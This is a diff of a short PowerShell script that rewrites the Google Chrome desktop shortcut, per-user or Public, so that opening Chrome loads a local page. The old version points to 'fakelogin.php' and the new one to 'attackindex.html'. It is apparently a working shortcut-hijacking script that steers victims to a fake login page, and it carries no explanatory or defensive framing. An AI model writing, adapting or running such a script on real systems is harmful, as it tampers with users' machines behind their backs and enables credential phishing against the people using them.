@@ -1,19 +1,22 @@
-# Instantiate a clean Windows Script Host object
-$wsh = New-Object -ComObject WScript.Shell
+$WshShell = New-Object -ComObject WScript.Shell
 
-# Define the user's specific desktop shortcut location
-$shortcutPath = "$env:USERPROFILE\Desktop\Google Chrome.lnk"
+# Define both possible paths where the desktop shortcut could live
+$UserShortcut = "$env:USERPROFILE\Desktop\Google Chrome.lnk"
+$PublicShortcut = "C:\Users\Public\Desktop\Google Chrome.lnk"
+$TargetFile = "file:///C:/Users/Public/attackindex.html"
 
-if (Test-Path $shortcutPath) {
-    # Open the existing shortcut template properties
-    $shortcut = $wsh.CreateShortcut($shortcutPath)
-    
-    # Append the local file path as the default runtime target parameter
-    $shortcut.Arguments = '"file:///C:/Users/kyson/fakelogin.php"'
-    
-    # Save changes back out to disk
-    $shortcut.Save()
-    Write-Output "Success: Google Chrome desktop shortcut target modified."
+if (Test-Path $UserShortcut) {
+    # Modify the shortcut in the personal account folder
+    $Shortcut = $WshShell.CreateShortcut($UserShortcut)
+    $Shortcut.Arguments = $TargetFile
+    $Shortcut.Save()
+    Write-Output "Successfully modified the user-specific Chrome shortcut."
+} elseif (Test-Path $PublicShortcut) {
+    # Modify the shortcut in the global public folder
+    $Shortcut = $WshShell.CreateShortcut($PublicShortcut)
+    $Shortcut.Arguments = $TargetFile
+    $Shortcut.Save()
+    Write-Output "Successfully modified the Public Chrome shortcut."
 } else {
-    Write-Error "Google Chrome desktop shortcut not located on this user profile."
+    Write-Error "Could not find a Google Chrome shortcut on the desktop maps."
 }
